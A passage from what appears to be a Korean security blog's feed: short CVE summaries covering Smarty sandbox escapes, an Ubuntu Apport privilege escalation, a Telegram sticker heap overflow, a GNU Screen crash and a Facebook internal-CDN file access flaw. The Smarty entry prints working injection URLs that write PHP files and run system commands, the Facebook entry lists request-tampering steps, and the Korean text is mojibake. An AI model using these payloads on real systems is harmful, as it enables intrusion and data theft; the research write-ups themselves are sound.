wcscpy_s()</code>ë¥¼ ì‚¬ìš©í•˜ëŠ”êµ°ìš”. ì¦‰ 100 bytes ë²„í¼ì— 100 bytes ë³µì‚¬ê°€ ì´ë£¨ì–´ì§€ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ 200 bytes(wchar_t 100ê°œ) ë³µì‚¬ê°€ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/29.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">gudc 0113fa50</code></pre><p>ë”°ë¼ì„œ ìœ„ ì‚¬ì§„ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´ 100 bytes ë²„í¼ë¥¼ ë„˜ì–´ì„œ í•˜ì´ë¼ì´íŠ¸ ëœ SFPì™€ RETê¹Œì§€ ì˜¤ì—¼ë©ë‹ˆë‹¤.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/29-1.png"></p><p>ì°¾ì•˜ë‹¤! Root Cause!</p><h1 id="Part-III-ì˜ˆê³ "><a href="#Part-III-ì˜ˆê³ " class="headerlink" title="Part III ì˜ˆê³ "></a>Part III ì˜ˆê³ </h1><p><img src="/2021/02/21/fabu1ous/ttd-2/31.png"></p><p>ì›ë˜ëŠ” TTDë¥¼ ë²„ê·¸ ë°”ìš´í‹°ì— ì‚¬ìš©í•´ë³´ë©´ì„œ ëŠë‚€ ì ì´ë‚˜ ê¿€íŒ ë“±ì„ ì •ë¦¬í•´ ì˜¬ë¦´ ìƒê°ì´ì—ˆëŠ”ë° ìµœê·¼ì— ë²„ê·¸ ë°”ìš´í‹°ë¥¼ ê±°ì˜ ì•ˆ í•´ì„œ ìƒí™©ì„ ì¢€ë” ì§€ì¼œë´ì•¼ í•  ê²ƒ ê°™ìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ì´ë²ˆ ê¸€ì„ ì‘ì„±í•˜ë©´ì„œ <code>dx</code>ëª…ë ¹ì–´ì™€ TTD.Memory objectë¥¼ ê°™ì´ ì“°ëŠ” ë°©ë²•ë„ ê³µë¶€ë¥¼ í•´ë´¤ëŠ”ë° ì—„ì²­ ì¢‹ë”ë¼ê³ ìš”.</p><p>ë‹¤ìŒ part 3ëŠ”</p><ol><li>TTD ë²„ê·¸ ë°”ìš´í‹°ì— ì‚¬ìš©í•´ë³´ê¸°</li><li>ê³ ì˜¤ê¸‰ ì‚¬ìš©ë²•</li></ol><p>ì´ ë‘˜ ì¤‘ í•˜ë‚˜ë¥¼ ë“¤ê³  ì˜¤ê² ìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Smarty Template Engine Sandbox escape</title>
    <link href="/2021/02/20/fabu1ous/2021-02-20/"/>
    <url>/2021/02/20/fabu1ous/2021-02-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html">Smarty Template Engine Sandbox escape PHP Code Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Smarty Endgine &lt;= 3.1.38</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>SmartyëŠ” PHPìš© template engineì…ë‹ˆë‹¤. SmartyëŠ” presentation(html/css)ê³¼ app logicì„ ë¶„ë¦¬ì‹œí‚¤ëŠ” PHP insulation(sandbox)ì„ í†µí•´ injection ê³µê²©ì˜ í”¼í•´ë²”ìœ„ë¥¼ ì œí•œí•©ë‹ˆë‹¤. í•˜ì§€ë§Œ Template injectionì´ ê°€ëŠ¥í•  ë•Œ sandbox escapeë¥¼ í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><ul><li>CVE-2021-26119</li></ul><p>super global ë³€ìˆ˜ <code>$smarty.template_object</code>ë¥¼ ì´ìš©í•œ  Template injectionì´ ê°€ëŠ¥í•  ë•Œ Smartyì˜ ì¸ìŠ¤í„´ìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>compile</code>í•¨ìˆ˜ê°€ <code>&#123;$poc=$smarty.template_object&#125;</code>ì™€ ê°™ì€ ê°’ì„ ë°›ìœ¼ë©´ <code>$poc</code>ì— <code>Smarty_Internal_Template</code> ê°ì²´ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.</p><pre><code class="hljs csharp"><span class="hljs-keyword">object</span>(Smarty_Internal_Template)<span class="hljs-meta">#7 (24) &#123;  </span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;_objType&quot;</span></span>]=&gt;  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)    [<span class="hljs-meta"><span class="hljs-meta-string">&quot;smarty&quot;</span></span>]=&gt;  &amp;<span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) &#123; ... &#125;</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;source&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Template_Source)<span class="hljs-meta">#8 (16) &#123; ... &#125;</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;parent&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) &#123; ... &#125;</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;ext&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Internal_Extension_Handler)<span class="hljs-meta">#10 (4) &#123; ... &#125;</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;compiled&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Template_Compiled)<span class="hljs-meta">#11 (12) &#123; ... &#125;</span></code></pre><p>ìœ„ëŠ” <code>Smarty_Internal_Template</code>ê°ì²´ì…ë‹ˆë‹¤. í•´ì»¤ëŠ” <code>[&quot;smarty&quot;]</code>ë˜ëŠ” <code>[&quot;parent&quot;]</code> ê°’ì„ ì‚¬ìš©í•´ Smartyì˜ ì¸ìŠ¤í„´ìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆê³  arbitrary file writeë¡œ ê³µê²© ë²”ìœ„ë¥¼ í™•ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs URL">http:&#x2F;&#x2F;localhost:8000&#x2F;page.php?poc&#x3D;string:&#123;$s&#x3D;$smarty.template_object-&gt;smarty&#125;&#123;$fp&#x3D;$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;</code></pre><ul><li>CVE-2021-26120</li></ul><p>template syntaxë¥¼ ì»´íŒŒì¼í•˜ëŠ” ê³¼ì •ì—ì„œ <code>Smarty_Internal_Runtime_TPlFunction</code>í´ë˜ìŠ¤ëŠ” attacker controlled dataì¸ <code>name</code>ì„ í•„í„°ë§í•˜ì§€ ì•Šì•„ í•¨ìˆ˜ ì¸ì ì…˜ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs javascript"><span class="hljs-comment">/* input = &#123;function name=&#x27;test&#x27;&#125;&#123;/function&#125; */</span><span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;smarty_template_function_test_8782550315ffc7c00946f78_05745875&#x27;</span>)) &#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smarty_template_function_test_8782550315ffc7c00946f78_05745875</span>(<span class="hljs-params">Smarty_Internal_Template $_smarty_tpl,$params</span>) </span>&#123;    foreach ($params <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;            $_smarty_tpl-&gt;tpl_vars[$key] = <span class="hljs-keyword">new</span> Smarty_Variable($value, $_smarty_tpl-&gt;isRenderingCache);        &#125;    &#125;&#125;</code></pre><p>ì…ë ¥ <code>&#123;function name=&#39;test&#39;&#125;&#123;/function&#125;</code>ì„ ë°›ì€ ì»´íŒŒì¼ëŸ¬ëŠ” ìœ„ì™€ ê°™ì€ ì½”ë“œë¥¼ ìƒì„±í•©ë‹ˆë‹¤. </p><pre><code class="hljs URL">http:&#x2F;&#x2F;localhost:8000&#x2F;page.php?poc&#x3D;string:&#123;function+name&#x3D;&#39;rce()&#123;&#125;;system(&quot;id&quot;);function+&#39;&#125;&#123;&#x2F;function&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>sandbox</tag>
      
      <tag>php</tag>
      
      <tag>injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Ubuntu í¬ë˜ì‹œ í•¸ë“¤ëŸ¬ Apportì˜ Local Privilege Escalation ì·¨ì•½ì </title>
    <link href="/2021/02/19/l0ch/2021-02-19/"/>
    <url>/2021/02/19/l0ch/2021-02-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://alephsecurity.com/2021/02/16/apport-lpe/">Exploiting crash handlers: LPE on Ubuntu</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Ubuntu 20.10 - 2.20.11-0ubuntu50.5 ì´ì „</p><p>Ubuntu 20.04 - 2.20.11-0ubuntu27.16 ì´ì „</p><p>Ubuntu 18.04 - 2.20.9-0ubuntu7.23 ì´ì „</p><p>Ubuntu 16.04 - 2.20.1-0ubuntu2.30 ì´ì „</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ubuntuì˜ í¬ë˜ì‹œ í•¸ë“¤ëŸ¬ì¸ Apportì—ì„œ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ApportëŠ” ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ì˜ í¬ë˜ì‹œ ë°œìƒ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê³  í¬ë˜ì‹œ ë¦¬í¬íŠ¸ë¥¼ ë§Œë“œëŠ” ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤.</p><p>ApportëŠ” í‘œì¤€ ì…ë ¥ì—ì„œ ì½”ì–´ ë¤í”„ë¥¼ ì½ì–´ í”„ë¡œì„¸ìŠ¤ì˜ í˜„ì¬ ë””ë ‰í„°ë¦¬ì— ìˆëŠ” ì½”ì–´ ë¤í”„ì— ìƒˆë¡œ ì“°ëŠ” <code>write_user_coredump()</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. <code>write_user_coredump()</code> ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ <code>drop_privileges()</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ ê¸°ì¡´ Apportì˜ ë£¨íŠ¸ ê¶Œí•œì„ í¬ë˜ì‹œê°€ ë°œìƒí•œ í”„ë¡œì„¸ìŠ¤ì˜ uidì™€ gidë¡œ ë³€ê²½í•´ í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ ê¶Œí•œìœ¼ë¡œ ì½”ì–´ ë¤í”„ë¥¼ ì‘ì„±í•©ë‹ˆë‹¤.</p><p>ì´ë•Œ <code>get_pid_info()</code> í•¨ìˆ˜ëŠ” <code>/proc/pid/status</code> íŒŒì¼ì—ì„œ uidì™€ gidë¥¼ ê°ê° <code>Uid:</code> ë° <code>Gid:</code>ë¡œ ì‹œì‘í•˜ëŠ” í–‰ì—ì„œ íŒŒì‹± í•©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ í”„ë¡œì„¸ìŠ¤ ì´ë¦„ì„ <code>a\rUid: 0\rGid: 0</code> ë¡œ ìƒì„±í•œ ë’¤ í¬ë˜ì‹œë¥¼ ë°œìƒì‹œí‚¤ë©´ uid ë° gidê°€ 0ìœ¼ë¡œ ì„¤ì •ë˜ë¯€ë¡œ <code>drop_privileges()</code> í•¨ìˆ˜ í˜¸ì¶œì„ ìš°íšŒí•˜ì—¬ ë£¨íŠ¸ ê¶Œí•œì„ ìœ ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ìœ„ ì·¨ì•½ì ì€ CVE-2021-25682ë¥¼ í• ë‹¹ë°›ì•˜ìœ¼ë©° Apportì˜ í¬ë˜ì‹œ ë°œìƒ ì´í›„ í”„ë¡œì„¸ìŠ¤ì˜ êµì²´ ê²€ì‚¬ ìš°íšŒ ì·¨ì•½ì (<a href="https://alephsecurity.com/vulns/aleph-2021001">CVE-2021-25683</a>) ë° ì„œë¹„ìŠ¤ ê±°ë¶€ ì·¨ì•½ì (<a href="https://alephsecurity.com/vulns/aleph-2021002">CVE-2021-25684</a>)ê³¼ ê°™ì´ ì•…ìš©ë˜ë©´ ì½”ì–´ ë¤í”„ì— ë¦¬ë²„ìŠ¤ ì‰˜ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•  ìˆ˜ ìˆì–´ root ê¶Œí•œìœ¼ë¡œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>local privilege escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] heap out-of-bounds write in Telegrams animated stickers</title>
    <link href="/2021/02/18/idioth/2021-02-18/"/>
    <url>/2021/02/18/idioth/2021-02-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.shielder.it/blog/2021/02/hunting-for-bugs-in-telegrams-animated-stickers-remote-attack-surface/">Hunting for bugs in Telegramâ€™s animated stickers remote attack surface</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>í…”ë ˆê·¸ë¨ ì•ˆë“œë¡œì´ë“œ v7.1.0(2090) (2020ë…„ 9ì›” 30ì¼ ë¦´ë¦¬ìŠ¤) ì´ì „ ë²„ì „</li><li>í…”ë ˆê·¸ë¨ iOS v7.1 (2020ë…„ 9ì›” 30ì¼ ë¦´ë¦¬ìŠ¤) ì´ì „ ë²„ì „</li><li>í…”ë ˆê·¸ë¨ macOS v7.1 (2020ë…„ 10ì›” 2ì¼ ë¦´ë¦¬ìŠ¤) ì´ì „ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í…”ë ˆê·¸ë¨ ë¹„ë°€ ì±„íŒ… ì• ë‹ˆë©”ì´ì…˜ ìŠ¤í‹°ì»¤ ê¸°ëŠ¥ì—ì„œ remote code executionì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í…”ë ˆê·¸ë¨ì€ ì• ë‹ˆë©”ì´ì…˜ ìŠ¤í‹°ì»¤ë¥¼ ë Œë”ë§ í•˜ê¸° ìœ„í•´ì„œ rlottieë¥¼ ìˆ˜ì •í•˜ì—¬ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ <code>VGradientCache::generateGradientColorTable</code>ì— ì¡´ì¬í•˜ë©°, ë°˜ë³µë¬¸ì˜ ë²”ìœ„ ê²€ì¦ ë¯¸í¡ìœ¼ë¡œ heap memory out-of-bound writeì´ ë°œìƒí•©ë‹ˆë‹¤.</p><pre><code class="hljs angelscript"><span class="hljs-built_in">bool</span> VGradientCache::generateGradientColorTable(<span class="hljs-keyword">const</span> VGradientStops &amp;stops,                                                <span class="hljs-built_in">float</span>                 opacity,                                                <span class="hljs-built_in">uint</span>32_t *colorTable, <span class="hljs-built_in">int</span> size)&#123;    <span class="hljs-built_in">int</span>                  dist, idist, pos = <span class="hljs-number">0</span>, i;    <span class="hljs-built_in">bool</span>                 alpha = <span class="hljs-literal">false</span>;    <span class="hljs-built_in">int</span>                  stopCount = stops.size();    <span class="hljs-keyword">const</span> VGradientStop *curr, *next, *start;    <span class="hljs-built_in">uint</span>32_t             curColor, nextColor;    <span class="hljs-built_in">float</span>                delta, t, incr, fpos;    <span class="hljs-keyword">if</span> (!vCompare(opacity, <span class="hljs-number">1.0f</span>)) alpha = <span class="hljs-literal">true</span>;    start = stops.data();    curr = start;    <span class="hljs-keyword">if</span> (!curr-&gt;second.isOpaque()) alpha = <span class="hljs-literal">true</span>;    curColor = curr-&gt;second.premulARGB(opacity);  <span class="hljs-comment">// out-of-bounds value, curr-&gt;second is controlled</span>    incr = <span class="hljs-number">1.0</span> / (<span class="hljs-built_in">float</span>)size;                     <span class="hljs-comment">// static</span>    fpos = <span class="hljs-number">1.5</span> * incr;                            <span class="hljs-comment">// static</span>    colorTable[pos++] = curColor;    <span class="hljs-keyword">while</span> (fpos &lt;= curr-&gt;first) &#123;                 <span class="hljs-comment">// curr-&gt;first is controlled and pos is not checked to be &lt; size, leading to </span>        colorTable[pos] = colorTable[pos - <span class="hljs-number">1</span>];    <span class="hljs-comment">// out-of-bounds write</span>        pos++;        fpos += incr;    &#125;    [...]</code></pre><p><code>size</code>, <code>fpos</code>, <code>incr</code>ëŠ” static valueì´ê³ , <code>curr-&gt;first</code>, <code>curr-&gt;second</code>ëŠ” ì• ë‹ˆë©”ì´ì…˜ ìŠ¤í‹°ì»¤ì—ì„œ ê°’ì„ ì§ì ‘ ë°›ì•„ì˜µë‹ˆë‹¤. ë°˜ë³µë¬¸ì—ì„œ <code>colorTable</code>ì„ í• ë‹¹í•  ë•Œ <code>pos</code>ì™€<code>colorTable</code> ë°°ì—´ í¬ê¸°ì¸  <code>size</code> ê°„ì˜ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šì•„ ì• ë‹ˆë©”ì´ì…˜ ìŠ¤í‹°ì»¤ì˜ <code>curr-&gt;first</code> ê°’ì— ë”°ë¼ í™ ë©”ëª¨ë¦¬ arbitrary overwriteê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ìŠ¤í‹°ì»¤ë¥¼ í†µí•´ overwrite ëœ ê°’ì€ <code>premulARGB()</code>ì™€ <code>getColorReplacement()</code>ë¥¼ í†µí•´ ì¸ì½”ë”© ë˜ê³ , í•´ë‹¹ í•¨ìˆ˜ë“¤ì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ í•´ì»¤ê°€ ì¡°ì‘í•  ìˆ˜ ìˆìœ¼ë©°, ASLR ìš°íšŒ ê°€ì ¯ì´ ì¡´ì¬í•˜ë©´ Remote Code Executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ ì‚¬ìš©ìê°€ ë³´ë‚¸ <code>sticker.id</code>ê°€ í…”ë ˆê·¸ë¨ í´ë¼ìš°ë“œì˜ public sticker setì— ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ì—¬ ì„ì˜ë¡œ ì¡°ì‘ëœ ìŠ¤í‹°ì»¤ íŒŒì¼ì„ ì „ì†¡í•  ìˆ˜ ì—†ëŠ” ë°©ë²•ìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>heap</tag>
      
      <tag>idioth</tag>
      
      <tag>telegram</tag>
      
      <tag>out-of-bounds</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] GNU Screen crashs while processing characters</title>
    <link href="/2021/02/17/fabu1ous/2021-02-17/"/>
    <url>/2021/02/17/fabu1ous/2021-02-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26937">CVE-2021-26937</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>GNU screen &lt;= 4.8.0</p><ul><li>Debian 9 ( GNU Screen 4.05.00 )</li><li>Raspbian 10 ( GNU Screen 4.06.02 )</li><li>Ubuntu 20.04.1 ( GNU Screen 4.08.00, Windows WSL )</li><li>Ubuntu 20.04 ( GNU Screen 4.08.00 )</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>GNU Screenì€ ì—¬ëŸ¬ í”„ë¡œì„¸ìŠ¤ì˜ í„°ë¯¸ë„ì„ í•œ í™”ë©´ì—ì„œ ì¡°ì‘í•  ìˆ˜ ìˆê²Œ ë„ì™€ì£¼ëŠ” multiplexerë¡œ, Mac OSXì™€ ëŒ€ë¶€ë¶„ì˜ Linux ë°°í¬íŒì— í¬í•¨ë˜ì–´ìˆìŠµë‹ˆë‹¤. GNU Screen 4.8.0 ì´ì „ ë²„ì „ì€ íŠ¹ì • UTF-8 ë¬¸ì ì¡°í•©ì„ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì—ì„œ ì·¨ì•½ì (CVE-2021-26937)ì´ ë°œìƒí•©ë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ ì›ê²© ì‹œìŠ¤í…œì„ ëŒ€ìƒìœ¼ë¡œ invalid write accessì™€ Dosë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!combchars[i])&#123;combchars[i] = (strcut comchar *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct combchar));<span class="hljs-keyword">if</span> (!comchars[i])<span class="hljs-keyword">return</span>;combchars[i]-&gt;prev = i;combchars[i]-&gt;next = i;&#125;</code></pre><p>encode.cì˜ ì¼ë¶€ ì½”ë“œì…ë‹ˆë‹¤. <code>comchars[i]</code>ì˜ out-of-rangeë¡œ ì¸í•´ íŠ¹ì • UTF-8 ë¬¸ìì—´ì´ í™”ë©´ì— ì¶œë ¥ë˜ë©´ GNU Screenì´ ë¹„ì •ìƒ ì¢…ë£Œë©ë‹ˆë‹¤.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h2><p><img src="/2021/02/17/fabu1ous/2021-02-17/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Access files uploaded by employees to internal CDNs</title>
    <link href="/2021/02/16/idioth/2021-02-16/"/>
    <url>/2021/02/16/idioth/2021-02-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ysamm.com/?p=606">Access files uploaded by employees to internal CDNs / Regenerate URL Signature of user uploaded content</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Facebook</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì¼ë°˜ í˜ì´ìŠ¤ë¶ ìœ ì €ê°€ ë¹„ê³µê°œë¡œ ëŒë¦¬ê±°ë‚˜ ì‚­ì œí•œ ì½˜í…ì¸ ë‚˜ ì§ì›ì´ ì—…ë¡œë“œí•œ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•´ ìœ íš¨í•œ íŒŒì¼ URLì´ ì¡´ì¬í•˜ë”ë¼ë„ ì¼ë°˜ ìœ ì €ê°€ ì ‘ê·¼í•  ìˆ˜ ì—†ëŠ” <code>interncache-cln.fbcdn.net</code>ê³¼ ê°™ì€ ë‚´ë¶€ CDNìœ¼ë¡œë¶€í„° íŒŒì¼ì„ ë°›ì•„ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë‹¤ìš´ë¡œë“œí•  íŒŒì¼ì€ íŒŒì¼(í•¸ë“¤)ì˜ idë¥¼ í‘œí˜„í•˜ëŠ” ì•”í˜¸í™”ëœ ë¬¸ìì—´ì„ í†µí•´ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì „ URLì´ë‚˜ íŒŒì¼ í•¸ë“¤ì„ ì•Œë©´ ë‚´ë¶€ CDNì— ì§ì›ì´ ì—…ë¡œë“œí•œ íŒŒì¼ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ ì„¸íŒ…ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>https://www.facebook.com/collabsmanager/start/</code>ì—ì„œ Creator ë“±ë¡í•©ë‹ˆë‹¤.</li><li>ìŠ¹ì¸ë˜ë©´, <code>https://www.facebook.com/collabsmanager/</code>ì— ì ‘ì†í•˜ì—¬ ë¡œê·¸ì¸í•©ë‹ˆë‹¤. <code>https://business.facebook.com/collabsmanager/creator/creator_portfolio/&#123;ID&#125;/</code>ì™€ ìœ ì‚¬í•œ URLë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸ ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.</li></ol><p>Creator ë“±ë¡ì´ ì™„ë£Œë˜ë©´, ë‹¤ìŒ ìˆœì„œë¡œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>request ë°˜ë³µì„ ìœ„í•´ BurpSuite ê°™ì€ í”„ë¡ì‹œ ì‹¤í–‰</li><li>â€œIntroductionâ€ì—ì„œ â€œEditâ€ í´ë¦­</li><li>â€œAdd Videoâ€ë¥¼ í´ë¦­í•˜ì—¬ ë¹„ë””ì˜¤ ì—…ë¡œë“œ</li><li>ì—…ë¡œë“œê°€ ì™„ë£Œë˜ë©´ â€œDeleteâ€ ë²„íŠ¼ì„ ëˆŒëŸ¬ ì—…ë¡œë“œëœ ë¹„ë””ì˜¤ ì‚­ì œ</li><li>BurpSuite historyì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ 3ê°œì˜ ì—”ë“œí¬ì¸íŠ¸ íšë“<ol><li><code>https://vupload-edge.facebook.com/ajax/video/upload/requests/start/</code></li><li><code>https://vupload-edge.facebook.com/ajax/video/upload/requests/receive/</code></li><li><code>https://business.facebook.com/branded_content/creator_profile/pitch_deck_video/async/save/</code></li></ol></li><li><code>file_extension</code> íŒŒë¼ë¯¸í„° ê°’ì„ <code>jpg</code>ë¡œ ìˆ˜ì • í›„ <code>https://vupload-edge.facebook.com/ajax/video/upload/requests/start/</code>ì— requestë¥¼ ë³´ë‚´ë©´ responseì˜ <code>video_id</code> XXXXXXXXë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li><code>video_id</code> íŒŒë¼ë¯¸í„° ê°’ì„ XXXXXXXXë¡œ ìˆ˜ì • í›„ <code>https://vupload-edge.facebook.com/ajax/video/upload/requests/receive/</code>ì— requestë¥¼ ë³´ëƒ…ë‹ˆë‹¤.</li><li><code>fpuploader_video_file_chunk</code> íŒŒë¼ë¯¸í„° ê°’ì„ ë‹¤ìŒê³¼ ê°™ì€ ê°’ìœ¼ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.<ul><li><code>1:dW5kZWZpbmVk:application/octet-stream:GBapFAFK2bAstIUBAAAAAACthEIbbj07AACa:e:1568148336:ARa5BNCPUwoIKBVqyao</code></li></ul></li></ol><p><code>GBapFAFK2bAstIUBAAAAAACthEIbbj07AACa</code>ëŠ” íŒŒì¼ì˜ HANDLEì´ë©°, CDNì— ì—…ë¡œë“œëœ íŒŒì¼ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì´ í•¸ë“¤ ê°’ì„ ìˆ˜ì •í•˜ì—¬ ë‹¤ìš´ë¡œë“œí•  íŒŒì¼ì„ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.(ex.<code>GFxcvkCRANjMRgABANB4MEoAAAAAbnsvAAAB </code>) í•¸ë“¤ ê°’ì„ ìˆ˜ì •í•œ í›„ <code>start_offset</code>ê³¼ <code>end_offset</code> ê°’ì„ ì–»ê¸° ìœ„í•´ responseë¥¼ ë°›ìŠµë‹ˆë‹¤.</p><ol start="9"><li><code>video_id</code>ë¥¼ XXXXXXXë¡œ ë°”ê¾¼ í›„ <code>https://business.facebook.com/branded_content/creator_profile/pitch_dec_video/async/save/</code>ì— requestë¥¼ 